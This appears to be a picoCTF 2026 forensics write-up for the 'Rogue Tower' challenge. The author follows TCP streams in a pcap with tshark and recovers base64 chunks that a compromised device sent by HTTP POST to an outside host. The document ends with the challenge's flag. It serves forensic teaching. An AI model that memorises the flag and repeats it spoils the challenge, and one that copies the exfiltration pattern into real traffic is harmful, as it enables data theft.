# 🚩Rogue Tower - picoCTF 2026

- **Category:** Forensics ⚙️
- **Difficulty:** Medium 
- **Target File:** `rogue_tower.pcap`
- **Key Skills And Tools:** strings, reading data
---

## 🔍 Challenge 

A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.

Download the network capture file: here

### 🧪 Logic Extraction:

```
                                                                                                                                                          
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,5 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

Q15TWnpif
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,6 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

kxBB1dACm
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,7 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

lbBF9bb0E
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,8 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

JQQtFbAQB
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,9 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 9

BQ1QXAEAS
===================================================================
                                                                                                                                                           
┌──(kali㉿kali)-[~/Tools/CTF1]
└─$ tshark -r rogue_tower.pcap -q -z follow,tcp,ascii,10 | sed -n '8,$p'
POST /upload HTTP/1.1
Host: 198.51.100.247
Content-Type: application/octet-stream
Content-Length: 3

g==
===================================================================

```


<div align="center">
  <img width="925" height="580" alt="image" src="https://github.com/user-attachments/assets/4c4f94af-6993-41bf-a54e-099022e5e3b1" />

</div>

#
<div align="center">
   <img width="1059" height="613" alt="image" src="https://github.com/user-attachments/assets/61331733-d467-473b-8db9-2e213a6347d0" />

</div> 

## Run 
.flag picoCTF{d3l_d0n7_h1d3_w3ll_4b0a805d}



